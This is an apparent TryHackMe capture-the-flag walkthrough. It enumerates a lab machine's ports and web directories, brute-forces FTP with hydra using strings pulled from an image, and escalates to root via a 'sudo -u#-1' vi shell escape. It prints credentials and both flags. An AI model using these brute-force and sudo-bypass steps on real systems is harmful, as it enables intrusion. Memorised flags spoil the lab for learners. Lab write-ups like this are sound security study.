<pre>
Machine IP: 10.10.50.59

Enum:
    Open ports:
        21/tcp open  ftp     vsftpd 3.0.2
        22/tcp open  ssh     OpenSSH 6.7p1 Debian 5 (protocol 2.0)
        80/tcp open  http    Apache httpd 2.4.10 ((Debian))


80/tcp http: enum gobuster
    /.htaccess (Status: 403)
/.htpasswd (Status: 403)
/.hta (Status: 403)
/assets (Status: 301)
/index.html (Status: 200)
/server-status (Status: 403)
    FInd a hidden dir:
        http://10.10.50.59/WExYY2Cv-qU/
            *and download hotbabe photo

21/tcp ftp: bruteforce
    $ strings Hot_Babe.png > passwords
    $ hydra -l ftpuser -P passwords 10.10.50.59 -t 4 ftp
        * creds => [21] login: ftpuser   password: 5iez1wGXKfPKQ

    Login!

    Found a Eli's_Creds.txt get it and decode it to https://www.dcode.fr/
        *User: eli Password: DSpDiM1wAEwid


User flag:    ssh login
gwendoline:MniVCQVhQHUNI

Priv esc:
    $ sudo -l 
        (ALL, !root) NOPASSWD: /usr/bin/vi /home/gwendoline/user.txt

    $ sudo -u#-1 /usr/bin/vi /home/gwendoline/user.txt
    :!sh
    And got root!

User Flag: THM{1107174691af9ff3681d2b5bdb5740b1589bae53}
Root Flag: THM{8d6f163a87a1c80de27a4fd61aef0f3a0ecf9161}
</pre>
